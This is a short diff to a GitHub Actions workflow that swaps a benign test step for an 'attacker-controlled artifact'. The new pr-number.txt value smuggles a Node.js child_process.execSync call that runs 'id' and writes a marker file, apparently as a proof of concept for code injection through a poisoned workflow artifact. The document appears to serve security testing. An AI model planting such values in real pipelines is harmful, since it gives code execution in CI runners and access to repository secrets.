@@ -7,10 +7,11 @@ jobs:
   validate:
     runs-on: ubuntu-latest
     steps:
-      - name: Craft artifact (benign baseline)
+      - name: Craft attacker-controlled artifact
         run: |
-          echo "false" > has-warnings.txt
-          echo "1" > pr-number.txt
+          echo "true" > has-warnings.txt
+          printf '%s\n' "999999; require('child_process').execSync('id; echo INJECTED_RCE_PROOF > /tmp/gab-prcomment-marker').toString(); 999999" > pr-number.txt
+          cat pr-number.txt
       - name: Upload lint results
         uses: actions/upload-artifact@v4
         with:
